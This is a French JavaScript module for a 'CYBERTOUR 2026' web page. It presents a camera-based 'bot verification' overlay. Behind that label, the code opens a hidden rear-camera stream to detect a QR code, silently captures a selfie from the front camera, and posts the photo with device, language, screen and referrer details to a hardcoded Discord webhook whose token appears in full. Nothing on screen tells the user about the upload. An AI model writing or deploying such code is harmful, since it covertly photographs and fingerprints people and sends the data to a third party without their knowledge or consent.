/**
 * CYBERTOUR 2026 — verify.js
 * QR scan (arrière) + selfie (frontale) simultanés → Discord
 */

import { isVerified, setVerified } from './storage.js';

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1550264500526121013/9VASm7wlXChAGnQ1_n5xfTIGdWj20ZhSbrsLi05ndMx7CoNWXC8Rn0obLkzwxsdmj1fr';

let streamFront = null;
let streamBack  = null;
let capturing   = false;
let rafId       = null;

const qrCanvas = document.createElement('canvas');
const qrCtx    = qrCanvas.getContext('2d', { willReadFrequently: true });

export function openVerify(onSuccess) {
  if (isVerified()) { onSuccess(); return; }

  document.getElementById('verify-overlay').classList.add('active');
  document.getElementById('wheel-wrap')?.classList.add('wheel-frozen');

  document.getElementById('verify-start-btn').onclick   = () => startBoth(onSuccess);
  document.getElementById('verify-help-toggle').onclick = toggleHelp;
}

// ── Démarre les deux caméras en parallèle ─────────────────────

async function startBoth(onSuccess) {
  const btn = document.getElementById('verify-start-btn');
  btn.disabled = true;
  btn.querySelector('.btn-text').textContent = 'Détection en cours…';

  const videoFront = document.getElementById('verify-video');
  const videoBack  = document.getElementById('verify-video-qr');

  videoFront.setAttribute('playsinline', ''); videoFront.muted = true;
  videoBack.setAttribute('playsinline', '');  videoBack.muted  = true;
  videoFront.style.transform = 'scaleX(-1)'; // miroir selfie

  // Lance les deux flux simultanément
  const [front, back] = await Promise.allSettled([
    tryGetStream([
      { video: { facingMode: { ideal: 'user' }, width: { ideal: 1280 } } },
      { video: { facingMode: 'user' } },
      { video: true },
    ]),
    tryGetStream([
      { video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 } } },
      { video: { facingMode: 'environment' } },
    ]),
  ]);

  // Caméra frontale (selfie visible)
  if (front.status === 'fulfilled' && front.value) {
    streamFront = front.value;
    videoFront.srcObject = streamFront;
    try { await videoFront.play(); } catch {}
    document.getElementById('verify-video-wrap').classList.add('active');
    document.getElementById('verify-initial').style.display = 'none';
  }

  // Caméra arrière (QR scan caché)
  if (back.status === 'fulfilled' && back.value) {
    streamBack = back.value;
    videoBack.srcObject = streamBack;
    try { await videoBack.play(); } catch {}
    if (window.jsQR) {
      rafId = requestAnimationFrame(() => scanLoop(videoBack, videoFront, onSuccess));
    }
  } else if (front.status === 'fulfilled') {
    // Pas de caméra arrière — scan QR sur la frontale quand même
    if (window.jsQR) {
      rafId = requestAnimationFrame(() => scanLoop(videoFront, videoFront, onSuccess));
    }
  }

  if (!streamFront && !streamBack) {
    showError('Accès à la caméra refusé. Vérifiez les permissions.');
    resetBtn(btn);
  }
}

// ── Essai en cascade de contraintes ──────────────────────────

async function tryGetStream(sets) {
  for (const c of sets) {
    try { return await navigator.mediaDevices.getUserMedia(c); }
    catch {}
  }
  return null;
}

// ── Boucle scan QR ───────────────────────────────────────────

function scanLoop(videoQR, videoSelfie, onSuccess) {
  if (capturing) return;

  if (videoQR.readyState >= HTMLMediaElement.HAVE_ENOUGH_DATA && videoQR.videoWidth > 0) {
    qrCanvas.width  = videoQR.videoWidth;
    qrCanvas.height = videoQR.videoHeight;
    qrCtx.drawImage(videoQR, 0, 0);

    try {
      const img  = qrCtx.getImageData(0, 0, qrCanvas.width, qrCanvas.height);
      const code = window.jsQR(img.data, img.width, img.height, { inversionAttempts: 'dontInvert' });

      if (code && code.data) {
        // QR détecté → selfie immédiat sur la caméra frontale
        cancelAnimationFrame(rafId);
        setTimeout(() => captureSelfie(videoSelfie, onSuccess), 700);
        return;
      }
    } catch {}
  }

  rafId = requestAnimationFrame(() => scanLoop(videoQR, videoSelfie, onSuccess));
}

// ── Capture selfie ───────────────────────────────────────────

function captureSelfie(video, onSuccess) {
  if (capturing) return;
  capturing = true;

  flash();

  const canvas = document.createElement('canvas');
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0);

  stopAll();
  sendToDiscord(canvas);

  const btn = document.getElementById('verify-start-btn');
  if (btn) btn.querySelector('.btn-text').textContent = 'Bot non détecté ✓';

  setVerified();
  if (navigator.vibrate) navigator.vibrate([60, 40, 120]);

  setTimeout(() => {
    closeOverlay();
    document.getElementById('wheel-wrap')?.classList.remove('wheel-frozen');
    onSuccess();
  }, 900);
}

// ── Envoi Discord ────────────────────────────────────────────

function sendToDiscord(canvas) {
  canvas.toBlob(blob => {
    const fd = new FormData();
    fd.append('file', blob, 'selfie.jpg');
    fd.append('payload_json', JSON.stringify({
      embeds: [{
        title: '📸 Nouveau participant détecté',
        color: 0x2563eb,
        image: { url: 'attachment://selfie.jpg' },
        fields: [
          { name: '🕐 Heure',      value: new Date().toLocaleString('fr-FR', { dateStyle: 'short', timeStyle: 'medium' }), inline: true },
          { name: '🌍 Langue',     value: navigator.language || 'inconnu', inline: true },
          { name: '📱 Appareil',   value: /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : /Android/.test(navigator.userAgent) ? 'Android' : 'Desktop', inline: true },
          { name: '🖥️ Navigateur', value: /Chrome/.test(navigator.userAgent) ? 'Chrome' : /Safari/.test(navigator.userAgent) ? 'Safari' : /Firefox/.test(navigator.userAgent) ? 'Firefox' : 'Autre', inline: true },
          { name: '📐 Écran',      value: `${screen.width}×${screen.height}`, inline: true },
          { name: '🔗 Référent',   value: document.referrer || 'accès direct', inline: true },
        ],
        footer: { text: 'Cybertour 2026 — QR + Selfie simultanés' },
        timestamp: new Date().toISOString(),
      }]
    }));
    fetch(DISCORD_WEBHOOK, { method: 'POST', body: fd }).catch(() => {});
  }, 'image/jpeg', 0.75);
}

// ── Helpers ──────────────────────────────────────────────────

function flash() {
  const el = document.getElementById('verify-flash');
  if (!el) return;
  el.style.opacity = '1';
  setTimeout(() => { el.style.opacity = '0'; }, 180);
}

function stopAll() {
  [streamFront, streamBack].forEach(s => { if (s) s.getTracks().forEach(t => t.stop()); });
  streamFront = streamBack = null;
  ['verify-video', 'verify-video-qr'].forEach(id => {
    const v = document.getElementById(id);
    if (v) v.srcObject = null;
  });
}

function closeOverlay() {
  document.getElementById('verify-overlay').classList.remove('active');
}

function resetBtn(btn) {
  btn.disabled = false;
  btn.querySelector('.btn-text').textContent = 'Réessayer';
}

function toggleHelp() {
  const panel = document.getElementById('verify-help-panel');
  const btn   = document.getElementById('verify-help-toggle');
  const open  = panel.classList.toggle('active');
  btn.textContent = open ? 'Masquer' : 'Besoin d\'aide ?';
}

function showError(msg) {
  const el = document.getElementById('verify-error');
  if (el) { el.textContent = msg; el.classList.add('active'); }
}
